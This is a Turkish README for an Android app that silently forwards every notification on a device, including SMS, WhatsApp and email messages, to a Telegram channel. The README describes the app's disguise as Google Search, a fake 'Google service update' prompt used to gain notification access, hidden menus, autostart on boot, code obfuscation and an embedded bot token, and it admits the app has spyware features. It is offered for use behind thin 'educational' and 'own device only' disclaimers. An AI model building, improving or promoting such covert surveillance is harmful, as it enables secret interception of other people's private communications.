# Notification Forwarder - Telegram Bildirim Aktarıcı

Bu uygulama, Android cihazınıza gelen tüm bildirimleri (SMS, WhatsApp, Facebook, Instagram ve diğer tüm uygulamalar) Telegram kanalınıza aktarır. Uygulamanın arayüzü Google Arama motoru gibi görünür.

## Özellikler

- **Bildirim Yakalama**: Tüm uygulamalardan gelen bildirimleri yakalar
- **Telegram Entegrasyonu**: Bildirimleri belirtilen Telegram kanalına gönderir
- **Gizli Arayüz**: Google Arama motoru kamuflajı
- **Offline Kuyruk**: İnternet bağlantısı olmadığında bildirimleri kuyruklar
- **Otomatik Başlangıç**: Cihaz yeniden başlatıldığında servis otomatik çalışır

## Kurulum

### Gereksinimler

- Android Studio Hedgehog (2023.1.1) veya üzeri
- Gradle 8.4
- Android SDK 24 (Android 7.0) veya üzeri
- JDK 17

### Adımlar

1. Projeyi Android Studio'da açın
2. Gradle senkronizasyonu bekleyin
3. Build > Build Bundle(s) / APK(s) > Build APK(s) ile APK oluşturun

### APK Yükleme

1. Oluşturulan APK'yı cihazınıza transfer edin
2. Bilinmeyen kaynaklardan yüklemeye izin verin
3. APK'yı yükleyin

## Kullanım

### 1. Bildirim İzni Verme

Uygulamayı ilk açtığında, "Google Hizmet Güncellemesi" adlı bir dialog görünecektir:

1. "İzin Ver" butonuna tıklayın
2. Açılan Ayarlar sayfasında bildirim erişimini etkinleştirin
3. Uygulamaya geri dönün

### 2. Gizli Özellikler

- **Servis Durumu**: Google logosuna 5 kez hızlı tıklama ile servis durumunu görüntüleyin
- **Ayarlar Menüsü**: Sağ üst köşedeki gizli alana tıklayarak ayarlara erişin

### 3. Test Mesajı

Ayarlar menüsünden "Test Mesajı Gönder" seçeneği ile Telegram bağlantısını test edebilirsiniz.

## Bildirim Formatı

Telegram'da aldığınız bildirimler şu formatta görünecektir:

```
🔔 Yeni Bildirim
────────────────────
📦 Uygulama: WhatsApp
👤 Gönderen: Ahmet
💬 Mesaj:
Merhaba! Yarınki toplantı saat kaçta?

⏰ Zaman: 15.01.2024 14:30
```

## Desteklenen Uygulamalar

Uygulama şu uygulamalardan gelen bildirimleri destekler:
- WhatsApp
- Facebook
- Instagram
- Telegram
- SMS/Mesajlar
- E-posta uygulamaları
- Ve diğer tüm uygulamalar...

## Teknik Detaylar

### Mimari

- **Dil**: Kotlin
- **Mimari Desen**: MVVM
- **Arka Plan İşlemleri**: WorkManager + Service
- **Veri Saklama**: Room Database
- **Ağ İletişimi**: Retrofit + OkHttp

### Servisler

- `NotificationForwarderService`: Bildirimleri yakalar
- `BootReceiver`: Cihaz açılışında servisi başlatır
- `RetrySenderWorker`: Başarısız gönderimleri tekrar dener

### Güvenlik

- Bildirimler doğrudan cihazdan Telegram sunucularına gönderilir
- Telegram token'ı uygulamada gömülüdür
- ProGuard ile kod karartma kullanılmaktadır

## Sorun Giderme

### Bildirimler Gelmiyor

1. Bildirim erişimini kontrol edin: Ayarlar > Uygulamalar > Google > Bildirimler
2. Servis durumunu kontrol edin (Google logosuna 5 kez tıklama)
3. Cihazı yeniden başlatın

### Telegram Mesajları Gitmiyor

1. İnternet bağlantınızı kontrol edin
2. Test mesajı göndererek bağlantıyı test edin
3. Token ve Chat ID'nin doğru olduğunu kontrol edin

## Uyarılar

⚠️ Bu uygulama Google Play Store'a yüklenemez çünkü:
- Gizli bildirim erişimi kullanır
- Casus yazılım özellikleri taşır

⚠️ Bu uygulamayı yalnızca kendi cihazınızda kullanın.

## Lisans

Bu proje eğitim amaçlıdır. Kullanım kendi sorumluluğunuzdadır.
